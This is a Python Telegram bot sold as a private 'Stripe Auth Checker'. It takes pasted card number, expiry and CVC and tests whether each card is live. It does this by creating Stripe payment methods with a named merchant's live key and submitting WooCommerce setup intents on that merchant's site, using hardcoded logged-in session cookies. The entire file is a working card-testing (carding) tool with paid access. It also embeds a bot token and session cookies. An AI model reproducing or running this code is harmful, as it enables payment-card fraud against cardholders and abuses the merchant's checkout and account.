import requests
import uuid
import time
import json
import re
import threading
import os
from typing import Optional, Dict, Any, List
from flask import Flask
import telebot  # pip install pyTelegramBotAPI flask requests

# ------------------------------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------------------------------
# Replace with your actual values
BOT_TOKEN = "7950514269:AAElXX262n31xiSn1pCxthxhuMpjw9VjtVg"
OWNER_ID = 0  # <--- REPLACE WITH YOUR TELEGRAM USER ID (Integer)
# Example: OWNER_ID = 123456789

# File to store allowed users (Note: On Render Free, this resets on redeploy)
USERS_FILE = "allowed_users.txt"

# Target Site Config
SITE_URL = "https://infiniteautowerks.com"
PUBLISHABLE_KEY = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"
COOKIES = """wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7C14873263ec0ace12b4c8926c1472fb012761f36b0d1dcfe2e7df480516bed7b5; wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7Ced82f62145a463255c68d252f811c3baaa30f700a9a0ec76d330611126f019de"""

# ------------------------------------------------------------------------------------------
# USER MANAGEMENT HELPERS
# ------------------------------------------------------------------------------------------
def load_allowed_users() -> List[int]:
    if not os.path.exists(USERS_FILE):
        return []
    try:
        with open(USERS_FILE, "r") as f:
            return [int(line.strip()) for line in f if line.strip().isdigit()]
    except:
        return []

def save_allowed_user(user_id: int):
    users = load_allowed_users()
    if user_id not in users:
        with open(USERS_FILE, "a") as f:
            f.write(f"{user_id}\n")

def remove_allowed_user(user_id: int):
    users = load_allowed_users()
    if user_id in users:
        users.remove(user_id)
        with open(USERS_FILE, "w") as f:
            for u in users:
                f.write(f"{u}\n")

# ------------------------------------------------------------------------------------------
# FLASK APP FOR HEALTH CHECKS (RENDER/PYTHONANYWHERE)
# ------------------------------------------------------------------------------------------
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!", 200

def run_web_server():
    # Use PORT env variable for Render, default to 8080
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive_ping():
    """Pings the server every 5 minutes to prevent sleeping on some free tiers."""
    while True:
        time.sleep(300)  # 5 minutes
        try:
            # Replace with your actual deployed URL if available
            # e.g., url = "https://your-app-name.onrender.com"
            # For localhost (container internal):
            port = int(os.environ.get("PORT", 8080))
            requests.get(f"http://127.0.0.1:{port}")
            print("Ping sent to keep alive")
        except Exception as e:
            print(f"Ping failed: {e}")

# ------------------------------------------------------------------------------------------
# STRIPE AUTOMATION LOGIC
# ------------------------------------------------------------------------------------------
COUNTRY_MAP = {
    'TH': 'Thailand', 'BR': 'Brazil', 'US': 'United States', 'IN': 'India',
    'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia', 'DE': 'Germany',
    'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'MX': 'Mexico', 'JP': 'Japan',
    'CN': 'China', 'KR': 'South Korea', 'RU': 'Russia', 'NL': 'Netherlands',
    'PH': 'Philippines', 'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapore',
    'VN': 'Vietnam', 'PK': 'Pakistan', 'BD': 'Bangladesh', 'NG': 'Nigeria',
    'ZA': 'South Africa', 'EG': 'Egypt', 'TR': 'Turkey', 'PL': 'Poland',
    'UA': 'Ukraine', 'AR': 'Argentina', 'CO': 'Colombia', 'CL': 'Chile',
    'PE': 'Peru', 'VE': 'Venezuela', 'SA': 'Saudi Arabia', 'AE': 'UAE',
    'IL': 'Israel', 'SE': 'Sweden', 'NO': 'Norway', 'DK': 'Denmark',
    'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria', 'CH': 'Switzerland',
    'PT': 'Portugal', 'GR': 'Greece', 'CZ': 'Czech Republic', 'RO': 'Romania',
    'HU': 'Hungary', 'IE': 'Ireland', 'NZ': 'New Zealand', 'HK': 'Hong Kong',
    'TW': 'Taiwan', 'KE': 'Kenya', 'GH': 'Ghana', 'MA': 'Morocco'
}

class StripeWooCommerceAutomation:
    def __init__(self, site_url: str, cookies: str = None, publishable_key: str = None):
        self.site_url = site_url.rstrip('/')
        self.cookies = cookies
        self.publishable_key = publishable_key
        self.session = requests.Session()
        if cookies:
            self._set_cookies(cookies)
    
    def _set_cookies(self, cookie_string: str):
        for item in cookie_string.split('; '):
            if '=' in item:
                key, value = item.split('=', 1)
                self.session.cookies.set(key, value)
    
    def _generate_session_ids(self) -> Dict[str, str]:
        return {
            'guid': str(uuid.uuid4()).replace('-', '')[:32] + 'ca450',
            'muid': str(uuid.uuid4()).replace('-', '')[:32] + '531d',
            'sid': str(uuid.uuid4()).replace('-', '')[:32] + '05f1',
            'client_session_id': str(uuid.uuid4()),
            'elements_session_config_id': str(uuid.uuid4())
        }
    
    def fetch_ajax_nonce(self) -> Optional[str]:
        url = f"{self.site_url}/my-account/add-payment-method/"
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        try:
            response = self.session.get(url, headers=headers, timeout=30)
            patterns = [
                r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"',
                r'_ajax_nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
                r'wc-stripe-[^"]*nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
                r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([a-f0-9]+)["\']',
            ]
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
            if not self.publishable_key:
                pk_match = re.search(r'pk_(?:live|test)_[a-zA-Z0-9]+', response.text)
                if pk_match:
                    self.publishable_key = pk_match.group(0)
            return None
        except requests.exceptions.RequestException:
            return None
    
    def create_payment_method(self, card_number, exp_month, exp_year, cvc, postal_code, country="US"):
        url = "https://api.stripe.com/v1/payment_methods"
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        session_ids = self._generate_session_ids()
        data = {
            'type': 'card',
            'card[number]': card_number,
            'card[cvc]': cvc,
            'card[exp_year]': exp_year,
            'card[exp_month]': exp_month,
            'billing_details[address][postal_code]': postal_code,
            'billing_details[address][country]': country,
            'key': self.publishable_key,
            'guid': session_ids['guid'],
            'muid': session_ids['muid'],
            'sid': session_ids['sid'],
            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent'
        }
        try:
            response = requests.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            return {
                'success': response.status_code == 200 and 'id' in result,
                'response': result,
                'payment_method_id': result.get('id'),
                'card_brand': result.get('card', {}).get('brand', '').upper(),
                'card_funding': result.get('card', {}).get('funding', '').upper(),
                'card_country': result.get('card', {}).get('country')
            }
        except Exception as e:
            return {'success': False, 'error': str(e), 'response': None}

    def confirm_setup_intent(self, payment_method_id, ajax_nonce):
        url = f"{self.site_url}/wp-admin/admin-ajax.php"
        headers = {
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'referer': f'{self.site_url}/my-account/add-payment-method/'
        }
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce
        }
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            try:
                result = response.json()
            except:
                result = {'raw': response.text}
            
            success = False
            if response.status_code == 200:
                if isinstance(result.get('success'), bool):
                    success = result.get('success')
                elif result.get('data', {}).get('status') == 'succeeded':
                    success = True
            
            error_msg = None
            if not success:
                error_msg = result.get('data', {}).get('error', {}).get('message')
            
            return {'success': success, 'response': result, 'error_message': error_msg}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def add_payment_method(self, card_number, exp_month, exp_year, cvc, postal_code="10001", country="US"):
        # Step 1
        pm = self.create_payment_method(card_number, exp_month, exp_year, cvc, postal_code, country)
        if not pm['success']:
            err = pm.get('response', {}).get('error', {}).get('message', 'Unknown Stripe Error')
            return {'success': False, 'msg': f"Stripe Token Failed: {err}", 'data': pm}
        
        # Step 2
        nonce = self.fetch_ajax_nonce()
        if not nonce:
            return {'success': False, 'msg': "Failed to get AJAX Nonce from site", 'data': pm}
        
        # Step 3
        confirm = self.confirm_setup_intent(pm['payment_method_id'], nonce)
        if confirm['success']:
            return {'success': True, 'msg': "Approved", 'data': pm}
        else:
            return {'success': False, 'msg': f"Declined: {confirm.get('error_message')}", 'data': pm}

# ------------------------------------------------------------------------------------------
# TELEGRAM BOT HANDLERS
# ------------------------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_TOKEN)

def parse_card_pipe(text):
    text = text.strip()
    # Simple regex for pipe or common separation
    match = re.search(r'(\d{15,16})[|/:\s]+(\d{1,2})[|/:\s]+(\d{2,4})[|/:\s]+(\d{3,4})', text)
    if match:
        return {
            'number': match.group(1),
            'month': match.group(2).zfill(2),
            'year': match.group(3)[-2:] if len(match.group(3)) == 4 else match.group(3),
            'cvc': match.group(4)
        }
    return None

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "🔥 *Stripe Auth Checker Bot* 🔥\n\n"
        "Welcome! This high-speed bot checks cards using Stripe Auth & WooCommerce Setup Intents.\n\n"
        "⚠️ *Access Restricted*\n"
        "This is a private bot. To gain access, you must contact the owner.\n\n"
        "💎 *Pricing & Offers*\n"
        "• *Access*: Message for approval.\n"
        "• *Personal Bot*: Want your own private checker? Pay *$5* to the owner and get a custom setup!\n\n"
        "👤 *Contact Owner*: @llegaccy\n\n"
        "👇 *How to Use*:\n"
        "`/chk cc|mm|yy|cvc`\n"
        f"🆔 Your ID: `{message.from_user.id}`"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

# ------------------------------------------------------------------------------------------
# ADMIN COMMANDS (ADD/REMOVE USERS)
# ------------------------------------------------------------------------------------------
@bot.message_handler(commands=['add'])
def add_user_command(message):
    if message.from_user.id != OWNER_ID:
        return # Ignore non-owners
    
    try:
        user_to_add = int(message.text.split()[1])
        save_allowed_user(user_to_add)
        bot.reply_to(message, f"✅ User {user_to_add} added to access list.")
    except:
        bot.reply_to(message, "⚠️ Usage: /add <user_id>")

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    if message.from_user.id != OWNER_ID:
        return
    
    try:
        user_to_remove = int(message.text.split()[1])
        remove_allowed_user(user_to_remove)
        bot.reply_to(message, f"❌ User {user_to_remove} removed from access list.")
    except:
        bot.reply_to(message, "⚠️ Usage: /remove <user_id>")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    if message.from_user.id != OWNER_ID:
        return
    
    users = load_allowed_users()
    if not users:
        bot.reply_to(message, "No users in allowed list.")
    else:
        bot.reply_to(message, f"👥 Authorized Users:\n" + "\n".join(str(u) for u in users))

# ------------------------------------------------------------------------------------------
# MAIN CHECKER CMD
# ------------------------------------------------------------------------------------------
@bot.message_handler(commands=['chk'])
def check_card_command(message):
    # Auth check
    allowed_users = load_allowed_users()
    # Allow Owner OR users in list
    if message.from_user.id != OWNER_ID and message.from_user.id not in allowed_users:
        bot.reply_to(message, f"❌ Not authorized. Contact @llegaccy to buy access.\nYour ID: `{message.from_user.id}`", parse_mode='Markdown')
        return

    msg_args = message.text.split(" ", 1)
    if len(msg_args) < 2:
        bot.reply_to(message, "⚠️ Usage: /chk cc|mm|yy|cvc")
        return
    
    card_raw = msg_args[1]
    card = parse_card_pipe(card_raw)
    
    if not card:
        bot.reply_to(message, "❌ Invalid card format. Use: cc|mm|yy|cvc")
        return

    status_msg = bot.reply_to(message, "⌛ Checking...")

    try:
        automation = StripeWooCommerceAutomation(
            site_url=SITE_URL,
            cookies=COOKIES,
            publishable_key=PUBLISHABLE_KEY
        )
        
        result = automation.add_payment_method(
            card_number=card['number'],
            exp_month=card['month'],
            exp_year=card['year'],
            cvc=card['cvc']
        )
        
        # Formatting response
        pm_data = result.get('data', {})
        card_brand = pm_data.get('card_brand', 'UNKNOWN')
        card_funding = pm_data.get('card_funding', 'UNKNOWN')
        country_code = pm_data.get('card_country', 'US')
        country_name = COUNTRY_MAP.get(country_code, country_code)
        
        status_emoji = "✅" if result['success'] else "❌"
        status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃" if result['success'] else "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃"
        
        response_text = (
            f"{status_emoji} {status_text} {status_emoji}\n\n"
            f"💳 𝐂𝐚𝐫𝐝: `{card['number']}|{card['month']}|{card['year']}|{card['cvc']}`\n"
            f"⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth\n"
            f"ℹ️ 𝐈𝐧𝐟𝐨: {card_brand} - {card_funding}\n"
            f"🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_name} ({country_code})\n"
            f"📝 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {result['msg']}\n\n"
            f"👤 𝐎𝐰𝐧𝐞𝐫: @llegaccy"
        )
        
        bot.edit_message_text(response_text, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode='Markdown')

    except Exception as e:
        bot.edit_message_text(f"⚠️ Error: {str(e)}", chat_id=message.chat.id, message_id=status_msg.message_id)

# ------------------------------------------------------------------------------------------
# EXECUTION
# ------------------------------------------------------------------------------------------
if __name__ == "__main__":
    # Start Keep-Alive Pinger in background
    pinger_thread = threading.Thread(target=keep_alive_ping)
    pinger_thread.daemon = True
    pinger_thread.start()

    # Start Flask Server in background (for Render/Health Checks)
    # Threading the Flask app so bot.polling can run in main thread
    server_thread = threading.Thread(target=run_web_server)
    server_thread.daemon = True
    server_thread.start()

    print("🤖 Bot Started...")
    bot.infinity_polling()
